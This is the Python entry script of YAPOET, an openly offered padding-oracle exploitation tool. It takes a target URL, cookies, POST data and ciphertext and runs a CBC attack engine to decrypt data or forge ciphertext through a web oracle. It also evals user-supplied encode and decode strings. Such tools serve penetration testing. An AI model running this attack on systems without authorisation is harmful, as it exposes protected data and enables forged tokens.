#!/usr/bin/env python

import errno
import optparse

from attackenginebase import AttackEngineBase
from cbcattackengine import CbcAttackEngine
from thirdparty.hexdump.hexdump import hexdump


def get_options(parser):
    parser.add_option("-u", "--url", dest="url",
                      help="Target URL (e.g. \"http://host.domain/?param1=value%2b1&param2=value%2b2\")")
    parser.add_option("-d", "--decrypt", dest="encrypted_data", help="Base64-encoded data to decrypt")
    parser.add_option("-e", "--encrypt", dest="plaintext_data", help="Plaintext data to encrypt (CBC mode only)")
    parser.add_option("--data", dest="post_data", help="POST data (e.g. \"param1=value%2b1&param2=value%2b1\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--block-size", dest="block_size", help="Cipher block size in bytes [default: %default]")
    parser.add_option("--iv", dest="iv",
                      help="Initialization vector (e.g. \"0x00,0x01,0x39...\") [default: 0x00 * BLOCK_SIZE]")
    parser.add_option("--mode", dest="mode", help="Mode of operation (\"CBC\") [default: %default]")
    parser.add_option("--encode-func", dest="encode_func",
                      help="Function to encode byte array data to string [default: %default]")
    parser.add_option("--decode-func", dest="decode_func",
                      help="Function to decode string from byte array data [default: %default]")

    parser.set_defaults(
        block_size=16,
        mode="CBC",
        encode_func="lambda byte_array: __import__('base64').b64encode(byte_array)",
        decode_func="lambda string: __import__('base64').b64decode(string)",
    )

    opts, _ = parser.parse_args()
    return opts


def try_process_options(options):
    if options.url and (options.encrypted_data or options.plaintext_data):
        if options.iv:
            options_iv = bytearray([int(i, 0) for i in options.iv.split(",")])
            if len(options_iv) != options.block_size:
                print("IV length must be equal to the BLOCK_SIZE value")
                exit(errno.EINVAL)
        else:
            options_iv = bytearray(b'\0' * options.block_size)

        engine_type = AttackEngineBase

        if options.mode == "CBC":
            engine_type = CbcAttackEngine
        else:
            print("Possible value for MODE is only \"CBC\"")
            exit(errno.EINVAL)

        attack_engine = engine_type(options.url, options.post_data, options.cookie, options.block_size, options_iv,
                                    options.mode, eval(options.encode_func), eval(options.decode_func))

        print("Using %s mode of operation, block size = %s bytes and IV = { %s}\n" % (
            options.mode, options.block_size, ''.join('{:02X} '.format(x) for x in options_iv)))

        if options.encrypted_data:
            print("Started decryption of `%s`" % options.encrypted_data)
            result = attack_engine.decrypt(options.encrypted_data)
            if result is not None:
                print("\n\nData has been decrypted via %s requests to:\n\n%s" % (
                    result.requests_count, hexdump(result.data_value, "return")))
            else:
                print("\n\n\Data were not decrypted: unexploitable or missing oracle")

        if options.plaintext_data:
            if options.mode != "CBC":
                print("Encryption is possible only in CBC mode")
                exit(errno.EINVAL)
            print("Started encryption of `%s`" % options.plaintext_data)
            result = attack_engine.encrypt(options.plaintext_data)
            if result is not None:
                print("\n\nData has been encrypted via %s requests to:\n\n%s" % (
                    result.requests_count, result.data_value.decode()))
            else:
                print("\n\n\Data were not encrypted: unexploitable or missing oracle")
        return True
    else:
        return False


if __name__ == "__main__":
    print("YAPOET: Yet Another Padding Oracle Exploitation Tool v0.3.0")
    print("https://github.com/kochetkov/Yapoet")
    print("by Vladimir Kochetkov <kochetkov.vladimir@gmail.com>")
    print()
    option_parser = optparse.OptionParser()

    if not try_process_options(get_options(option_parser)):
        option_parser.print_help()
        print("\nPlease note that the position of attacking data in URL, POST_DATA or COOKIE"
              "\noptions should be picked by the %encrypted_data% placeholder")
